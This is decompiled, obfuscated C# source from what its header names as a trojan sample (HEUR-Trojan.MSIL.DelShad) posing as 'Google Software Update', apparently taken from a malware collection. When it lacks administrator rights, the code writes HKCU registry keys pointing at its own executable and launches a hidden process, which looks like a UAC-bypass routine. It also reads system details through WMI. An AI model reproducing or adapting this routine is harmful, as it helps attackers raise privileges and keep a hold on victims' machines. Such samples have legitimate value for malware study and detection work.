// Decompiled with JetBrains decompiler
// Type: C3904355907.C3372436214
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace C3904355907
{
  public class C3372436214
  {
    public static void C3554254475()
    {
      if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
      {
        C3372436214.C3554254475(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JL());
        C3372436214.C3554254475(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jl());
        C3372436214.C3554254475(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JM());
        C3372436214.C3554254475(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jm());
        RegistryKey registryKey = C3372436214.C3554254475(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JN());
        string location = Assembly.GetExecutingAssembly().Location;
        registryKey.SetValue(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz(), (object) location, RegistryValueKind.String);
        registryKey.SetValue(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iC(), (object) 0, RegistryValueKind.DWord);
        registryKey.Close();
        try
        {
          Process.Start(new ProcessStartInfo()
          {
            CreateNoWindow = true,
            UseShellExecute = false,
            FileName = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.id(),
            Arguments = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jn()
          });
        }
        catch
        {
        }
        Process.GetCurrentProcess().Kill();
      }
      else
        C3372436214.C3554254475(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JN()).SetValue(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz(), (object) DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz(), RegistryValueKind.String);
    }

    public static RegistryKey C3554254475([In] string obj0)
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JO() + obj0, true);
      if (!C3372436214.C3554254475(registryKey))
        registryKey = Registry.CurrentUser.CreateSubKey(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JO() + obj0);
      return registryKey;
    }

    public static bool C3554254475([In] RegistryKey obj0) => obj0 != null;

    private static ManagementObject C3904355907([In] string obj0)
    {
      ManagementClass managementClass = new ManagementClass(obj0);
      try
      {
        foreach (ManagementObject instance in managementClass.GetInstances())
        {
          if (instance != null)
            return instance;
        }
      }
      catch
      {
      }
      return (ManagementObject) null;
    }

    public static string C3904355907()
    {
      string str;
      try
      {
        ManagementObject managementObject = C3372436214.C3904355907(DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jo());
        str = managementObject != null ? managementObject[DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cY()] as string : string.Empty;
      }
      catch (Exception ex)
      {
        str = string.Empty;
      }
      return str;
    }
  }
}
